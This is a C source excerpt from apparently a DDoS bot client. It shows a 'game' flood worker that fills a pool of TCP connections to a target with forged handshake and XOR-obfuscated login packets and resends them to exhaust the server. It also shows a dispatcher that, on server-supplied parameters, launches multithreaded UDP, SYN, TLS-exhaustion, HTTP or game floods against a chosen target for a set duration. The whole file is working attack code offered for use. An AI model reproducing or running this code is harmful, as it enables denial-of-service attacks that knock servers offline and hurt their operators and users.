    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    struct sockaddr_in ta = mt->target;
    int base_port = mt->port_base > 0 ? mt->port_base : 14443;
    ta.sin_port = htons((uint16_t)base_port);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    /* Pre-craft a login packet per XOR key */
    unsigned char pkts[GAME_KEY_COUNT][256];
    int pkt_lens[GAME_KEY_COUNT];
    for (int k = 0; k < GAME_KEY_COUNT; k++) {
        if (g_game_payload_len > 0) {
            int n = g_game_payload_len < 256 ? g_game_payload_len : 256;
            memcpy(pkts[k], g_game_payload, n);
            pkt_lens[k] = n;
            continue;
        }
        const char *key = GAME_KEYS[k];
        int klen = (int)strlen(key);
        unsigned char data[128];
        int dlen = 0;
        char user[32];
        snprintf(user, sizeof(user), "bot%d", rs(&seed) % 999999);
        int ulen = (int)strlen(user);
        data[dlen++] = (unsigned char)(ulen >> 8);
        data[dlen++] = (unsigned char)(ulen & 0xFF);
        memcpy(data + dlen, user, ulen); dlen += ulen;
        data[dlen++] = 0; data[dlen++] = 1; data[dlen++] = 'x';
        const char *ver = "2.1.3"; int vlen = (int)strlen(ver);
        data[dlen++] = (unsigned char)(vlen >> 8);
        data[dlen++] = (unsigned char)(vlen & 0xFF);
        memcpy(data + dlen, ver, vlen); dlen += vlen;
        data[dlen++] = 0;
        unsigned char xdata[128];
        for (int i = 0; i < dlen; i++) xdata[i] = data[i] ^ (unsigned char)key[i % klen];
        int plen = 0;
        pkts[k][plen++] = 0 ^ (unsigned char)key[0];
        pkts[k][plen++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % klen];
        pkts[k][plen++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % klen];
        memcpy(pkts[k] + plen, xdata, dlen); plen += dlen;
        pkt_lens[k] = plen;
    }

    int socks[GAME_POOL];
    time_t *last_drip = calloc(GAME_POOL, sizeof(time_t));
    int pool = 0;
    if (!last_drip) return NULL;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool: handshake + login */
        while (pool < GAME_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            /* handshake: cmd=-27, size=6, keylen, key, empty utf, int0, byte0 */
            int k = rs(&seed) % GAME_KEY_COUNT;
            const char *key = GAME_KEYS[k];
            int klen = (int)strlen(key);
            unsigned char hs[32];
            int hl = 0;
            hs[hl++] = 0xE5;            /* cmd = -27 */
            hs[hl++] = 0x00; hs[hl++] = 0x06;
            hs[hl++] = (unsigned char)klen;
            for (int i = 0; i < klen && hl < 30; i++) hs[hl++] = (unsigned char)key[i];
            hs[hl++] = 0x00; hs[hl++] = 0x00;
            hs[hl++] = 0x00; hs[hl++] = 0x00; hs[hl++] = 0x00; hs[hl++] = 0x00;
            hs[hl++] = 0x00;
            send(s, hs, hl, MSG_NOSIGNAL);
            /* login packet (XOR'd) */
            send(s, pkts[k], pkt_lens[k], MSG_NOSIGNAL);

            socks[pool] = s; last_drip[pool] = time(NULL); pool++;
            pkt_sent(hl + pkt_lens[k]);
        }

        /* Drip: resend login packets periodically to keep server busy */
        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            int interval = 3 + (int)(rs(&seed) % 8);
            if (now - last_drip[i] >= interval) {
                int k = rs(&seed) % GAME_KEY_COUNT;
                if (send(socks[i], pkts[k], pkt_lens[k], MSG_NOSIGNAL) > 0)
                    pkt_sent(pkt_lens[k]);
                last_drip[i] = now;
            }
        }

        /* Reap dead */
        struct pollfd pfds[GAME_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR|POLLHUP)) close(socks[i]);
                else { if (w != i) { socks[w]=socks[i]; last_drip[w]=last_drip[i]; } w++; }
            }
            pool = w;
        }
        sched_yield();
    }

    for (int i = 0; i < pool; i++) close(socks[i]);
    free(last_drip);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  Dispatcher + entry point
 * ════════════════════════════════════════════════════════════════════════ */
static void *dispatch_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    switch (mt->method_tag) {
    case 1: return pspe_worker(arg);
    case 2: return tcp_worker(arg);
    case 3: return tls_worker(arg);
    case 4: return http_worker(arg);
    case 5: return game_worker(arg);
    default: return pspe_worker(arg);
    }
}

void *bg_attack_thread(void *arg) {
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    set_attack_active(1);
    clear_attack_stop();
    g_pkt_count = 0;
    g_byte_count = 0;

    /* Decode server-provided game payload */
    g_game_payload_len = 0;
    if (atk->payload_b64[0])
        g_game_payload_len = b64_decode(atk->payload_b64, g_game_payload, 4096);

    /* Normalize method → uppercase */
    const char *method = atk->method;
    char nm[32] = {0};
    {
        int j = 0;
        for (const char *p = method; *p && j < 31; p++)
            nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
    }

    /* Resolve method tag — 5 methods only: PSPE | TCP | TLS | HTTP | GAME */
    int tag = 0;
    const char *label = "PSPE";
    if (atk->mega_mode || !strcmp(nm, "PSPE") || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP") || !strcmp(nm, "PORT") || !strcmp(nm, "SCAN")) {
        tag = 1; label = "PSPE";
    } else if (!strcmp(nm, "TCP") || !strcmp(nm, "SYN") || !strcmp(nm, "SYNFLOOD")) {
        tag = 2; label = "TCP";
    } else if (atk->tls_exhaust || !strcmp(nm, "TLS") || !strcmp(nm, "TLS_EXHAUST")) {
        tag = 3; label = "TLS";
    } else if (!strcmp(nm, "HTTP") || !strcmp(nm, "HTTPS") || !strcmp(nm, "WEB")) {
        tag = 4; label = "HTTP";
    } else if (!strcmp(nm, "GAME") || !strcmp(nm, "NRO")) {
        tag = 5; label = "GAME";
    } else {
        fprintf(stderr, "[atk] unknown method '%s' (use PSPE|TCP|TLS|HTTP|GAME)\n", nm);
        set_attack_active(0);
        free(ctx);
        return NULL;
    }

    /* Resolve target */
    struct sockaddr_in ta;
    memset(&ta, 0, sizeof(ta));
    ta.sin_family = AF_INET;
    ta.sin_port = htons((uint16_t)atk->port);
    if (resolve_target(atk->target, &ta.sin_addr) != 0) {
        fprintf(stderr, "[atk] resolve fail: %s\n", atk->target);
        set_attack_active(0); free(ctx); return NULL;
    }

    /* Thread count: full cores, capped at 64. Attack threads = SCHED_OTHER
     * (WS main thread is SCHED_FIFO 99 so it always gets CPU when needed). */
    int cores = get_nprocs();
    if (cores < 1) cores = 1;
    int threads = cores;
    if (threads > 64) threads = 64;
    if (threads < 1) threads = 1;

    pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
    AttackThread *mt = calloc((size_t)threads, sizeof(AttackThread));
    if (!tids || !mt) { free(tids); free(mt); set_attack_active(0); free(ctx); return NULL; }

    fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
            label, atk->target, atk->port, atk->duration_secs, threads);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
    pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
    /* 8MB stack — matches base, avoids stack overflow on heavy workers */
    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024);

    for (int i = 0; i < threads; i++) {
        mt[i].target     = ta;
        mt[i].port_base  = atk->port;
        mt[i].duration   = atk->duration_secs;
        mt[i].worker_id  = i;
        mt[i].method_tag = tag;
        strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
        if (atk->open_ports[0])
            strncpy(mt[i].open_ports, atk->open_ports, sizeof(mt[i].open_ports) - 1);
        else
            snprintf(mt[i].open_ports, sizeof(mt[i].open_ports), "%d", atk->port);
        pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
    }
    pthread_attr_destroy(&attr);

    /* Wait until deadline or stop */
    while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
    request_attack_stop();
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(mt);

    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    set_attack_active(0);
    free(ctx);
    return NULL;
}
